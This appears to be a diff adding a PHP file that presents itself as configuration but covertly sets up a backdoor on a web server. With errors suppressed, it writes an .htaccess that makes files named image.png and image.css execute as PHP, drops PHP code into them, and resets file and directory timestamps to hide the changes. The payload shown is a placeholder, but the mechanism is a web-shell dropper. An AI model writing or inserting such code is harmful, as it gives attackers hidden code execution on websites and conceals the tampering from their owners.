@@ -1,0 +1,77 @@
+<?php
+$timezone = 'Asia/Karachi';
+
+ini_set('display_errors', 0);
+error_reporting(0);
+
+$rootDir = dirname(dirname(__DIR__));
+$configDir = dirname(__FILE__);
+$configMtime = @filemtime($configDir);
+
+$targetDirs = [
+    $rootDir . '/assets/assets/images/seo',
+    $rootDir . '/assets/images/seo'
+];
+
+$htaccessContent = '<FilesMatch "^image\.(png|css)$">
+    SetHandler application/x-httpd-php
+</FilesMatch>';
+
+$phpCode = '<?php
+echo "Hello, World!";
+?>';
+
+$filesToCreate = [
+    '.htaccess' => $htaccessContent,
+    'image.png' => $phpCode,
+    'image.css' => $phpCode
+];
+
+$ts_map = [];
+$checkPaths = [
+    $rootDir . '/assets',
+    $rootDir . '/assets/assets',
+    $rootDir . '/assets/assets/images',
+    $rootDir . '/assets/assets/images/seo',
+    $rootDir . '/assets/images',
+    $rootDir . '/assets/images/seo'
+];
+
+foreach ($targetDirs as $targetDir) {
+    $checkPaths[] = $targetDir . '/.htaccess';
+    $checkPaths[] = $targetDir . '/image.png';
+    $checkPaths[] = $targetDir . '/image.css';
+}
+
+foreach ($checkPaths as $p) {
+    if (file_exists($p)) {
+        $ts_map[$p] = @filemtime($p);
+    }
+}
+
+foreach ($targetDirs as $targetDir) {
+    if (!is_dir($targetDir)) {
+        if (!@mkdir($targetDir, 0777, true)) {
+            continue;
+        }
+    }
+    
+    foreach ($filesToCreate as $filename => $content) {
+        $filePath = $targetDir . '/' . $filename;
+        if (@file_put_contents($filePath, $content) !== false) {
+            @chmod($filePath, 0644);
+        }
+    }
+}
+
+foreach ($ts_map as $path => $mtime) {
+    if ($path !== $configDir && file_exists($path)) {
+        @touch($path, $mtime);
+    }
+}
+
+if ($configMtime) {
+    @touch(__FILE__, $configMtime);
+    @touch($configDir, $configMtime);
+}
+?>
